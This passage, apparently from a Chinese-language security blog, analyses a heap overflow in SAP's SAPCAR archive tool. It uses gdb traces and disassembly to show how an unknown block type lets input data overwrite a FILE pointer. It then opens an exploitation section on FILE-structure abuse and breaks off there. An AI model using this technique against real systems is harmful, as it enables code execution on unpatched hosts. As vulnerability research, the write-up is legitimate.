    0xa1d890:    0x6d942db80cb306f7    0xb31049e79a5e9c99
    0xa1d8a0:    0x5bceaebdc9b16ad3    0x05d38708178849d0
    0xa1d8b0:    0x39c05825344a4838    0x00000000005b6750
    0xa1d8c0:    0xdacaadadcf57bed4    0x4806b9a200000002
    0xa1d8d0:    0x00000000005a8594    0x00007ffff6593fdc
    0xa1d8e0:    0x00007ffff6594088    0x30302e3220524143
    0xa1d8f0:    0x000081b6f6594752    0x0000000000043200
    0xa1d900:    0x00007fff00000000    0x0000000035be41f6
我们可以通过grep命令得知这些值其实都存在于我们的测试文件中，准确说来，它们都位于测试文件的结尾部分：
    $ grep -obUaP "xa2xb9x06x48x94x85x5a" crashes/lala4
    30501:HZ
    $ xxd crashes/lala4 | grep 7720
    00007720: da7a 62ed e2a2 b906 4894 855a            .zb.....H..Z
那么我们可以修改堆内存中的数据吗？我们可以通过向输入文件结尾添加数据并重新运行代码来得到答案：
    $ echo AAAABBBB >> crashes/lala4
这一次的崩溃发生在_IO_feof，而我们现在可以完全控制文件指针的值了：
    Stopped reason: SIGSEGV
    _IO_feof (fp=0x42414141415a8594) at feof.c:35
**3.2 导致漏洞出现的根本原因**
使用bt命令查看了整个栈的back-trace之后，我们发现了调用feof的函数：
       0x4386f0:    push   rbp
       0x4386f1:    mov    rbp,rsp
       0x4386f4:    mov    QWORD PTR [rbp-0x8],r13
       0x4386f8:    mov    r13,rdi
       0x4386fb:    mov    QWORD PTR [rbp-0x18],rbx
       0x4386ff:    mov    QWORD PTR [rbp-0x10],r12
       0x438703:    sub    rsp,0x20
       0x438707:    mov    r12,rcx
       0x43870a:    mov    rcx,QWORD PTR [r13+0x18]
       0x43870e:    mov    rdi,rsi
       0x438711:    mov    rbx,rdx
       0x438714:    mov    esi,0x1
       0x438719:    call   0x40b3e0 
       0x43871e:    cmp    rbx,rax
       0x438721:    mov    QWORD PTR [r12],rax
       0x438725:    je     0x438734
       0x438727:    mov    rdi,QWORD PTR [r13+0x18]
       0x43872b:    call   0x40b340 
接下来，我们在fread处（0x438719）设置了一个断点，然后重新运行程序。除此之外，我们需要弄清楚原始的文件指针发生了什么，所以我们还设置了一个检测点，当它被重写时我们要暂停程序的执行。我们可以通过检查那些传递给文件IO函数的参数来得到文件指针的原始地址。
    Breakpoint 2, __GI__IO_fread (buf=0x7fffffffcb10, size=0x1, count=0x2, fp=0xa2da10) at iofread.c:31
    gdb-peda$ find 0xa2da10
    Searching for '0xa2da10' in: None ranges
    Found 1 results, display max 1 items:
    [heap] : 0xa1d8d0 --> 0xa2da10 --> 0xfbad2488 
    gdb-peda$ watch *0xa1d8d0
    Hardware watchpoint 1: *0xa1d8d0
我们可以看到第一个检测点，这部分数据是正确的：
    Hardware watchpoint 1: *0xa1d8d0
    Old value = 0x0
    New value = 0xa2da10
    0x000000000043859f in ?? ()
而第二个检测点则出现了溢出的情况：
    Hardware watchpoint 1: *0xa1d8d0
    Old value = 0xa2da10
    New value = 0x415a8594
    gdb-peda$ bt
    #0  0x00007ffff6c3a680 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
    #1  0x00007ffff6bbcf79 in __GI__IO_file_xsgetn (fp=0xa2da10, data=, n=0xb5ef) at fileops.c:1434
    #2  0x00007ffff6bb2236 in __GI__IO_fread (buf=, size=0x1, count=0xb5ef, fp=0xa2da10) at iofread.c:38
    #3  0x000000000043871e in ?? ()
    #4  0x000000000040c01a in ?? ()
    #5  0x000000000040dc5f in ?? ()
    #6  0x0000000000418e23 in ?? ()
    #7  0x000000000042bc43 in ?? ()
    #8  0x000000000043fc66 in ?? ()
    #9  0x00007ffff6b64830 in __libc_start_main (main=0x43ffb0, argc=0x3, argv=0x7fffffffe498, init=, fini=, rtld_fini=, stack_end=0x7fffffffe488)
        at ../csu/libc-start.c:291
于是，我们可以看到fread被调用并读取了0xb5ef字节，并导致了文件指针被重写。检测数据如下：
    fread  size          contents
    -----------------------------------------------------------------------------    #1     0x8 bytes     File Format / Version = CAR 2.00
    #2     0x22 bytes    RG (regular file)
    #3     0xd bytes     File name = sapevents.dll
    #4     0x2 bytes     Block type - SAPCAR_BLOCK_TYPE_COMPRESSED = "DA"
    #5     0x4 bytes     ????
    #6     0x2 bytes     Block type - SAPCAR_BLOCK_TYPE_COMPRESSED = "DA"
    #7     0x4 bytes     ????
    #8     0x2 bytes     Block type - INVALID TYPE = "D>"
    #9     0x20 bytes    ????
    #10    0xb5ef bytes  User controlled data that will overwrite stuff on the heap
有效的数据块类型为DA、ED、UD和UE。当文件中包含其他标识符时，程序将会额外读取32个字节，其中包含某些文件元数据（细节内容尚不知晓）。但是在对输入内容的最后四个字节数据进行了分析之后，我们发现它包含的是下一个fread的大小：
    gdb-peda$ x/32xb 0xa2dc62
    0xa2dc62:    0x01    0xac    0xa6    0x08    0x3c    0x27    0xb8    0xc4
    0xa2dc6a:    0x62    0x28    0x9d    0x19    0xe2    0xd3    0xa3    0xc3
    0xa2dc72:    0xcb    0x94    0x5d    0xec    0x02    0x36    0x7b    0x9f
    0xa2dc7a:    0x52    0xb8    0x2a    0xfb    0x1f    0x6a    0xef    0xb5
在输入文件中修改了这些字节数据之后，我们将能够控制传递给fread的数据大小（最多2个字节）。通过对之前malloc的访问以及程序执行流的监控，我们找到了导致漏洞出现的原因：
    0x40c01e:    mov    rcx,r14
       0x40c021:    mov    esi,0x1100
       0x40c026:    mov    rdi,r14
       0x40c029:    call   0x4a73a0
    --->
       0x4a73a0:    push   rbp
       0x4a73a1:    mov    rbp,rsp
       0x4a73a4:    mov    QWORD PTR [rbp-0x28],rbx
       0x4a73a8:    mov    QWORD PTR [rbp-0x20],r12
       0x4a73ac:    mov    rbx,rcx
       0x4a73af:    mov    QWORD PTR [rbp-0x18],r13
       0x4a73b3:    mov    QWORD PTR [rbp-0x10],r14
       0x4a73b7:    mov    r14,rdi
       0x4a73ba:    mov    QWORD PTR [rbp-0x8],r15
       0x4a73be:    mov    edi,esi
       0x4a73c0:    sub    rsp,0x40
       0x4a73c4:    mov    r12d,esi
       0x4a73c7:    mov    r15,rdx
       0x4a73ca:    call   0x459720
    --->
       0x45973d:    mov    r13d,edi
       [...]
       0x45977d:    movsxd rdi,r13d
       0x459780:    call   0x40b0c0 
现在，引起溢出的原因已经很明显了：我们将任意大小（最大为0xffff）的数据拷贝到了一个大小只有0x1100的缓冲区中。因为当数据块类型未知时，程序只会根据输入文件中的元数据大小来动态分配缓冲区空间。
通过整合上述这些内容，我们就可以设计一个简单的漏洞利用技术来实现代码执行了。
**四、漏洞利用**
由于我们可以重写指向FILE结构的指针，因此漏洞的利用也是非常简单的。在设计漏洞利用方法之前，我们首先要了解这个名叫[how2heap](https://github.com/shellphish/how2heap)的库，并且读一下Kees
Cook的这篇关于利用FILE结构的文章【[点我阅读](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/)】。
核心思想如下：当fopen被调用时，系统会分配一个新的FILE结构。glibc将会分配一个内部结构，其中包含结构体_IO_FILE和一个指向另一个结构体（调用_IO_jump_t）的指针:
    Breakpoint 1, __GI__IO_fread (buf=0xa1d8e8, size=0x1, count=0x8, fp=0xa2da10) at iofread.c:31
    gdb-peda$ p *fp
    $2 = {
      _flags = 0xfbad2488, 
      _IO_read_ptr = 0x0, 
      _IO_read_end = 0x0, 
      _IO_read_base = 0x0, 
      _IO_write_base = 0x0, 